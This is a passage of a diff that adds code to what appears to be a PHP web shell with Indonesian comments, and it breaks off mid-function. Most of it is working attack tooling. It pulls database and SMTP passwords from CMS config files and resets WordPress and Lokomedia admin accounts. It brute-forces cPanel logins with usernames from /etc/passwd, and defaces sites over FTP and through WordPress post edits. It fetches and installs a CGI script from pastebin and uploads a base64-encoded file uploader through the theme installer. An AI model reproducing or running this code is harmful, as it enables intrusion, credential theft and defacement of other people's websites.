+          $result = mysql_fetch_array($q);
+          $target = $result[alamat_website];
+          if($target == '') {
+            $target2 = $result[url];
+            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+            if($target2 == '') {
+              $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+            } else {
+              $cek_login3 = file_get_contents("$target2/adminweb/");
+              $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
+              if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
+                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
+              } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
+                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
+              } else {
+                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+              }
+            }
+          } else {
+            $cek_login = file_get_contents("$target/adminweb/");
+            $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
+            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
+              $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
+            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
+              $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
+            } else {
+              $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+            }
+          }
+          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
+          echo "Config => ".$file_conf."<br>";
+          echo "CMS => Lokomedia<br>";
+          if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
+            echo $url_target2;
+          } else {
+            echo $url_target;
+          }
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+          } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+          }
+          mysql_close($conn);
+        }
+      }
+    }
+  } else {
+    echo "<center>
+    <h1>Auto Edit User Config</h1>
+    <form method='post'>
+    DIR Config: <br>
+    <input type='text' size='50' name='config_dir' value='$dir'><br><br>
+    Set User & Pass: <br>
+    <input type='text' name='user_baru' value='m3r1c4' placeholder='user_baru'><br>
+    <input type='text' name='pass_baru' value='m3r1c4' placeholder='pass_baru'><br>
+    <input type='submit' name='hajar' value='Submit' style='width: 100px;'>
+    </form>
+    <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
+    ";
+  }
+} elseif($_GET['do'] == 'cpanel') {
+  if($_POST['crack']) {
+    $usercp = explode("\r\n", $_POST['user_cp']);
+    $passcp = explode("\r\n", $_POST['pass_cp']);
+    $i = 0;
+    foreach($usercp as $ucp) {
+      foreach($passcp as $pcp) {
+        if(@mysql_connect('localhost', $ucp, $pcp)) {
+          if($_SESSION[$ucp] && $_SESSION[$pcp]) {
+          } else {
+            $_SESSION[$ucp] = "1";
+            $_SESSION[$pcp] = "1";
+            if($ucp == '' || $pcp == '') {
+              
+            } else {
+              $i++;
+              if(function_exists('posix_getpwuid')) {
+                $domain_cp = file_get_contents("/etc/named.conf");  
+                if($domain_cp == '') {
+                  $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
+                } else {
+                  preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
+                  foreach($domains_cp[1] as $dj) {
+                    $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                    $user_cp_url = $user_cp_url['name'];
+                    if($user_cp_url == $ucp) {
+                      $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
+                      break;
+                    }
+                  }
+                }
+              } else {
+                $dom = "<font color=red>function is Disable by system</font>";
+              }
+              echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
+            }
+          }
+        }
+      }
+    }
+    if($i == 0) {
+    } else {
+      echo "<br>Succes!".$i." Cpanel from <font color=lime>Allah SWT</font>";
+    }
+  } else {
+    echo "<center>
+    <form method='post'>
+    USER: <br>
+    <textarea style='width: 450px; height: 150px;' name='user_cp'>";
+    $_usercp = fopen("/etc/passwd","r");
+    while($getu = fgets($_usercp)) {
+      if($getu == '' || !$_usercp) {
+        echo "<font color=red>Can't read /etc/passwd</font>";
+      } else {
+        preg_match_all("/(.*?):x:/", $getu, $u);
+        foreach($u[1] as $user_cp) {
+            if(is_dir("/home/$user_cp/public_html")) {
+              echo "$user_cp\n";
+          }
+        }
+      }
+    }
+    echo "</textarea><br>
+    PASS: <br>
+    <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
+    function cp_pass($dir) {
+      $pass = "";
+      $dira = scandir($dir);
+      foreach($dira as $dirb) {
+        if(!is_file("$dir/$dirb")) continue;
+        $ambil = file_get_contents("$dir/$dirb");
+        if(preg_match("/WordPress/", $ambil)) {
+          $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
+        } elseif(preg_match("/JConfig|joomla/", $ambil)) {
+          $pass .= ambilkata($ambil,"password = '","'")."\n";
+        } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
+          $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
+        } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
+          $pass .= ambilkata($ambil,'password = "','"')."\n";
+        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
+          $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
+        } elseif(preg_match("/client/", $ambil)) {
+          preg_match("/password=(.*)/", $ambil, $pass1);
+          if(preg_match('/"/', $pass1[1])) {
+            $pass1[1] = str_replace('"', "", $pass1[1]);
+            $pass .= $pass1[1]."\n";
+          }
+        } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
+          $pass .= ambilkata($ambil,"db_password = '","'")."\n";
+        }
+      }
+      echo $pass;
+    }
+    $cp_pass = cp_pass($dir);
+    echo $cp_pass;
+    echo "</textarea><br>
+    <input type='submit' name='crack' style='width: 100px;' value='Crack'>
+    </form>
+    <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
+  }
+} elseif($_GET['do'] == 'cpftp_auto') {
+  if($_POST['crack']) {
+    $usercp = explode("\r\n", $_POST['user_cp']);
+    $passcp = explode("\r\n", $_POST['pass_cp']);
+    $i = 0;
+    foreach($usercp as $ucp) {
+      foreach($passcp as $pcp) {
+        if(@mysql_connect('localhost', $ucp, $pcp)) {
+          if($_SESSION[$ucp] && $_SESSION[$pcp]) {
+          } else {
+            $_SESSION[$ucp] = "1";
+            $_SESSION[$pcp] = "1";
+            if($ucp == '' || $pcp == '') {
+              //
+            } else {
+              echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
+              $ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
+              $ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
+              if((!$ftp_login) || (!$ftp_conn)) {
+                echo "[+] <font color=red>Login Gagal</font><br><br>";
+              } else {
+                echo "[+] <font color=lime>Login Sukses</font><br>";
+                $fi = htmlspecialchars($_POST['file_deface']);
+                $deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
+                if($deface) {
+                  $i++;
+                  echo "[+] <font color=lime>Deface Sukses</font><br>";
+                  if(function_exists('posix_getpwuid')) {
+                    $domain_cp = file_get_contents("/etc/named.conf");  
+                    if($domain_cp == '') {
+                      echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
+                    } else {
+                      preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
+                      foreach($domains_cp[1] as $dj) {
+                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                        $user_cp_url = $user_cp_url['name'];
+                        if($user_cp_url == $ucp) {
+                          echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
+                          break;
+                        }
+                      }
+                    }
+                  } else {
+                    echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
+                  }
+                } else {
+                  echo "[-] <font color=red>Deface Gagal</font><br><br>";
+                }
+              }
+              //echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
+            }
+          }
+        }
+      }
+    }
+    if($i == 0) {
+    } else {
+      echo "<br>Succes Deface! ".$i." Cpanel From <font color=lime>ALLAH SWT</font>";
+    }
+  } else {
+    echo "<center>
+    <form method='post'>
+    Filename: <br>
+    <input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
+    Deface Page: <br>
+    <input type='text' name='deface' placeholder='http://www.web-yang-udah-do-deface.com/filemu.php' style='width: 450px;'><br>
+    USER: <br>
+    <textarea style='width: 450px; height: 150px;' name='user_cp'>";
+    $_usercp = fopen("/etc/passwd","r");
+    while($getu = fgets($_usercp)) {
+      if($getu == '' || !$_usercp) {
+        echo "<font color=red>Can't read /etc/passwd</font>";
+      } else {
+        preg_match_all("/(.*?):x:/", $getu, $u);
+        foreach($u[1] as $user_cp) {
+            if(is_dir("/home/$user_cp/public_html")) {
+              echo "$user_cp\n";
+          }
+        }
+      }
+    }
+    echo "</textarea><br>
+    PASS: <br>
+    <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
+    function cp_pass($dir) {
+      $pass = "";
+      $dira = scandir($dir);
+      foreach($dira as $dirb) {
+        if(!is_file("$dir/$dirb")) continue;
+        $ambil = file_get_contents("$dir/$dirb");
+        if(preg_match("/WordPress/", $ambil)) {
+          $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
+        } elseif(preg_match("/JConfig|joomla/", $ambil)) {
+          $pass .= ambilkata($ambil,"password = '","'")."\n";
+        } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
+          $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
+        } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
+          $pass .= ambilkata($ambil,'password = "','"')."\n";
+        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
+          $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
+        } elseif(preg_match("/client/", $ambil)) {
+          preg_match("/password=(.*)/", $ambil, $pass1);
+          if(preg_match('/"/', $pass1[1])) {
+            $pass1[1] = str_replace('"', "", $pass1[1]);
+            $pass .= $pass1[1]."\n";
+          }
+        } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
+          $pass .= ambilkata($ambil,"db_password = '","'")."\n";
+        }
+      }
+      echo $pass;
+    }
+    $cp_pass = cp_pass($dir);
+    echo $cp_pass;
+    echo "</textarea><br>
+    <input type='submit' name='crack' style='width: 100px;' value='Submit'>
+    </form>
+    <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
+  }
+} elseif($_GET['do'] == 'smtp') {
+  echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
+  function scj($dir) {
+    $dira = scandir($dir);
+    foreach($dira as $dirb) {
+      if(!is_file("$dir/$dirb")) continue;
+      $ambil = file_get_contents("$dir/$dirb");
+      $ambil = str_replace("$", "", $ambil);
+      if(preg_match("/JConfig|joomla/", $ambil)) {
+        $smtp_host = ambilkata($ambil,"smtphost = '","'");
+        $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
+        $smtp_user = ambilkata($ambil,"smtpuser = '","'");
+        $smtp_pass = ambilkata($ambil,"smtppass = '","'");
+        $smtp_port = ambilkata($ambil,"smtpport = '","'");
+        $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
+        echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
+        echo "SMTP port: <font color=lime>$smtp_port</font><br>";
+        echo "SMTP user: <font color=lime>$smtp_user</font><br>";
+        echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
+        echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
+        echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
+      }
+    }
+  }
+  $smpt_hunter = scj($dir);
+  echo $smpt_hunter;
+} elseif($_GET['do'] == 'auto_wp') {
+  if($_POST['hajar']) {
+    $title = htmlspecialchars($_POST['new_title']);
+    $pn_title = str_replace(" ", "-", $title);
+    if($_POST['cek_edit'] == "Y") {
+      $script = $_POST['edit_content'];
+    } else {
+      $script = $title;
+    }
+    $conf = $_POST['config_dir'];
+    $scan_conf = scandir($conf);
+    foreach($scan_conf as $file_conf) {
+      if(!is_file("$conf/$file_conf")) continue;
+      $config = file_get_contents("$conf/$file_conf");
+      if(preg_match("/WordPress/", $config)) {
+        $dbhost = ambilkata($config,"DB_HOST', '","'");
+        $dbuser = ambilkata($config,"DB_USER', '","'");
+        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+        $dbname = ambilkata($config,"DB_NAME', '","'");
+        $dbprefix = ambilkata($config,"table_prefix  = '","'");
+        $prefix = $dbprefix."posts";
+        $option = $dbprefix."options";
+        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+        $db = mysql_select_db($dbname);
+        $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
+        $result = mysql_fetch_array($q);
+        $id = $result[ID];
+        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+        $result2 = mysql_fetch_array($q2);
+        $target = $result2[option_value];
+        $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
+        $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
+        echo "<div style='margin: 5px auto;'>";
+        if($target == '') {
+          echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
+        } else {
+          echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
+        }
+        if(!$update OR !$conn OR !$db) {
+          echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
+        } else {
+          echo "<font color=lime>sukses di ganti.</font><br>";
+        }
+        echo "</div>";
+        mysql_close($conn);
+      }
+    }
+  } else {
+    echo "<center>
+    <h1>Auto Edit Title+Content WordPress</h1>
+    <form method='post'>
+    DIR Config: <br>
+    <input type='text' size='50' name='config_dir' value='$dir'><br><br>
+    Set Title: <br>
+    <input type='text' name='new_title' value='Hacked by ' placeholder='New Title'><br><br>
+    Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
+    <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
+    <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
+    <input type='submit' name='hajar' value='Submit' style='width: 100px;'><br>
+    </form>
+    <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
+    ";
+  }
+} elseif($_GET['do'] == 'zoneh') {
+  if($_POST['submit']) {
+    $domain = explode("\r\n", $_POST['url']);
+    $nick =  $_POST['nick'];
+    echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+    echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+    function zoneh($url,$nick) {
+      $ch = curl_init("http://www.zone-h.com/notify/single");
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+          curl_setopt($ch, CURLOPT_POST, true);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
+      return curl_exec($ch);
+          curl_close($ch);
+    }
+    foreach($domain as $url) {
+      $zoneh = zoneh($url,$nick);
+      if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
+        echo "$url -> <font color=lime>OK</font><br>";
+      } else {
+        echo "$url -> <font color=red>ERROR</font><br>";
+      }
+    }
+  } else {
+    echo "<center><form method='post'>
+    <u>Defacer</u>: <br>
+    <input type='text' name='nick' size='58' value='./MekiTembem404'><br>
+    <u>Domains</u>: <br>
+    <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
+    <input type='submit' name='submit' value='Submit' style='width: 100px;'>
+    </form>";
+  }
+  echo "</center>";
+} elseif($_GET['do'] == 'cgi') {
+  $cgi_dir = mkdir('idx_cgi', 0755);
+  $file_cgi = "idx_cgi/cgi.izo";
+  $isi_htcgi = "AddHandler cgi-script .izo";
+  $htcgi = fopen(".htaccess", "w");
+  $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
+  $cgi = fopen($file_cgi, "w");
+  fwrite($cgi, $cgi_script);
+  fwrite($htcgi, $isi_htcgi);
+  chmod($file_cgi, 0755);
+  echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='270%' frameborder='0' scrolling='yes'></iframe>";
+} elseif($_GET['do'] == 'fake_root') {
+  ob_start();
+  function reverse($url) {
+    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
+        curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_POST, 1);
+    $resp = curl_exec($ch);
+    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
+    $array = explode(",,", $resp);
+    unset($array[0]);
+    foreach($array as $lnk) {
+      $lnk = "http://$lnk";
+      $lnk = str_replace(",", "", $lnk);
+      echo $lnk."\n";
+      ob_flush();
+      flush();
+    }
+        curl_close($ch);
+  }
+  function cek($url) {
+    $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $resp = curl_exec($ch);
+    return $resp;
+  }
+  $cwd = getcwd();
+  $ambil_user = explode("/", $cwd);
+  $user = $ambil_user[2];
+  if($_POST['reverse']) {
+    $site = explode("\r\n", $_POST['url']);
+    $file = $_POST['file'];
+    foreach($site as $url) {
+      $cek = cek("$url/~$user/$file");
+      if(preg_match("/hacked/i", $cek)) {
+        echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
+      }
+    }
+  } else {
+    echo "<center><form method='post'>
+    Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
+    User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
+    Domain: <br>
+    <textarea style='width: 450px; height: 250px;' name='url'>";
+    reverse($_SERVER['HTTP_HOST']);
+    echo "</textarea><br>
+    <input type='submit' name='reverse' value='Scan' style='width: 100px;'>
+    </form><br>
+    NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
+  }
+} elseif($_GET['do'] == 'adminer') {
+  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+  function adminer($url, $isi) {
+    $fp = fopen($isi, "w");
+    $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+          curl_setopt($ch, CURLOPT_FILE, $fp);
+    return curl_exec($ch);
+          curl_close($ch);
+    fclose($fp);
+    ob_flush();
+    flush();
+  }
+  if(file_exists('adminer.php')) {
+    echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+  } else {
+    if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
+      echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+    } else {
+      echo "<center><font color=red>gagal buat file adminer</font></center>";
+    }
+  }
+} elseif($_GET['do'] == 'auto_dwp') {
+  if($_POST['auto_deface_wp']) {
+    function anucurl($sites) {
+        $ch = curl_init($sites);
+              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+              curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+              curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+              curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
+              curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
+              curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+      $data = curl_exec($ch);
+          curl_close($ch);
+      return $data;
+    }
+    function lohgin($cek, $web, $userr, $pass, $wp_submit) {
+        $post = array(
+                   "log" => "$userr",
+                   "pwd" => "$pass",
+                   "rememberme" => "forever",
+                   "wp-submit" => "$wp_submit",
+                   "redirect_to" => "$web",
+                   "testcookie" => "1",
+                   );
+      $ch = curl_init($cek);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+          curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+          curl_setopt($ch, CURLOPT_POST, 1);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
+          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
+          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+      $data = curl_exec($ch);
+          curl_close($ch);
+      return $data;
+    }
+    $scan = $_POST['link_config'];
+    $link_config = scandir($scan);
+    $script = htmlspecialchars($_POST['script']);
+    $user = "indoxploit";
+    $pass = "indoxploit";
+    $passx = md5($pass);
+    foreach($link_config as $dir_config) {
+      if(!is_file("$scan/$dir_config")) continue;
+      $config = file_get_contents("$scan/$dir_config");
+      if(preg_match("/WordPress/", $config)) {
+        $dbhost = ambilkata($config,"DB_HOST', '","'");
+        $dbuser = ambilkata($config,"DB_USER', '","'");
+        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+        $dbname = ambilkata($config,"DB_NAME', '","'");
+        $dbprefix = ambilkata($config,"table_prefix  = '","'");
+        $prefix = $dbprefix."users";
+        $option = $dbprefix."options";
+        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+        $db = mysql_select_db($dbname);
+        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+        $result = mysql_fetch_array($q);
+        $id = $result[ID];
+        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+        $result2 = mysql_fetch_array($q2);
+        $target = $result2[option_value];
+        if($target == '') {         
+          echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
+        } else {
+          echo "[+] $target <br>";
+        }
+        $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
+        if(!$conn OR !$db OR !$update) {
+          echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
+          mysql_close($conn);
+        } else {
+          $site = "$target/wp-login.php";
+          $site2 = "$target/wp-admin/theme-install.php?upload";
+          $b1 = anucurl($site2);
+          $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
+          $b = lohgin($site, $site2, $user, $pass, $wp_sub);
+          $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
+          $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
+          $www = "m.php";
+          $fp5 = fopen($www,"w");
+          fputs($fp5,$upload3);
+          $post2 = array(
+              "_wpnonce" => "$anu2",
+              "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
+              "themezip" => "@$www",
+              "install-theme-submit" => "Install Now",
+              );
+          $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
+              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+              curl_setopt($ch, CURLOPT_POST, 1);
+              curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
+              curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
+              curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
+                curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+          $data3 = curl_exec($ch);
+              curl_close($ch);
+          $y = date("Y");
+          $m = date("m");
+          $namafile = "id.php";
+          $fpi = fopen($namafile,"w");
+          fputs($fpi,$script);
+          $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
+               curl_setopt($ch6, CURLOPT_POST, true);
+               curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
+               curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
+               curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
+                     curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
+                     curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
+          $postResult = curl_exec($ch6);
+               curl_close($ch6);
+          $as = "$target/k.php";
+          $bs = anucurl($as);
+          if(preg_match("#$script#is", $bs)) {
+                      echo "[+] <font color='lime'>Berhasil...</font><br>";
+                      echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
+                      } else {
+                      echo "[-] <font color='red'>Gagal...</font><br>";
+                      echo "[!!] coba aja manual: <br>";
+                      echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
+                      echo "[+] username: <font color=lime>$user</font><br>";
+                      echo "[+] password: <font color=lime>$pass</font><br><br>";     
+                      }
+                mysql_close($conn);
+        }
+      }
+    }
+  } else {
+    echo "<center><h1>WordPress Auto Deface</h1>
+    <form method='post'>
+    <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
+    <input type='text' name='script' height='10' size='50' placeholder='Hacked by ' required><br>
+    <input type='submit' style='width: 100px;' name='auto_deface_wp' value='Submit'>
+    </form>
+    <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
+    </center>";
+  }
+} elseif($_GET['do'] == 'auto_dwp2') {
+  if($_POST['auto_deface_wp']) {
+    function anucurl($sites) {
+        $ch = curl_init($sites);
+              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+              curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+              curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+              curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
+              curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
+              curl_setopt($ch, CURLOPT_COOKIESESSION,true);
+      $data = curl_exec($ch);
+          curl_close($ch);
+      return $data;
+    }
+    function lohgin($cek, $web, $userr, $pass, $wp_submit) {
+        $post = array(
+                   "log" => "$userr",
+                   "pwd" => "$pass",
+                   "rememberme" => "forever",
+                   "wp-submit" => "$wp_submit",
+                   "redirect_to" => "$web",
+                   "testcookie" => "1",
+                   );
+      $ch = curl_init($cek);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+          curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
